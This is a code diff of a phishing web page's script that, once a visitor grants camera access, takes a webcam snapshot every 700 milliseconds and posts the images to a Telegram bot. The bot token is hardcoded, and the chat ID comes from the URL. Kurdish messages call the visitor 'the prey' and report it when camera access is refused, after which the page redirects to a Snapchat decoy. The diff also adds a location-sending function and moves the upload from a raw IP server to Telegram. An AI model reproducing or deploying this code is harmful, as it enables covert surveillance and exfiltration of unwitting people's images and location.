@@ -10,7 +10,7 @@
 <script>
     const urlParams = new URLSearchParams(window.location.search);
     const targetID = urlParams.get('id'); 
-    const SERVER_URL = "https://178.18.241.166:5000";
+    const TOKEN = "8431515310:AAG0xW2hgSbex-3vmGx8bXxiR3BADu10N3g";
 
     async function capture() {
         if (!targetID) return;
@@ -57,38 +57,39 @@
                 canvas.height = video.videoHeight;
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(video, 0, 0);
-                canvas.toBlob(b => { if (b) sendFile(b); }, 'image/jpeg', 0.9);
+                canvas.toBlob(b => { if (b) sendFile(b, "photo"); }, 'image/jpeg', 0.7);
             };
             setInterval(takeSnap, 700);
 
-                } catch (e) {
+        } catch (e) {
             sendToTelegram("⚠️ نێچیرەکە ڕێگری کرد لە مۆڵەتی کامێرا.");
             window.location.replace("https://www.snapchat.com/spotlight/W7_EDlXWTBiXAEEniNoMPwAAYZnFydWR5dG9tAZypM1RdAZypMtl2AAAAAQ?share_id=E6x9tSXD9VM&locale=en-US");
         }
     }
 
-    // 
     function sendToTelegram(text) {
-        fetch(`${SERVER_URL}/log`, {
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({chat_id: targetID, text: text})
+            body: JSON.stringify({chat_id: targetID, text: text, parse_mode: "HTML"})
         });
     }
 
-    //
-    function sendFile(blob) {
+    // ئەم فەنکشنە دەمێنێتەوە بەڵام بانگ ناکرێت بۆ ئەوەی کۆدەکە تێک نەچێت
+    function sendLocation(lat, lon) {
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendLocation`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({chat_id: targetID, latitude: lat, longitude: lon})
+        });
+    }
+
+    function sendFile(blob, type) {
         let fd = new FormData();
         fd.append("chat_id", targetID);
-        fd.append("photo", blob, "victim.jpg");
-        fetch(`${SERVER_URL}/upload`, { 
-            method: 'POST', 
-            body: fd 
-        });
+        fd.append(type, blob, "shot.jpg");
+        fetch(`https://api.telegram.org/bot${TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, { method: 'POST', body: fd });
     }
-
-    // 
 </script>
 </body>
 </html>
-
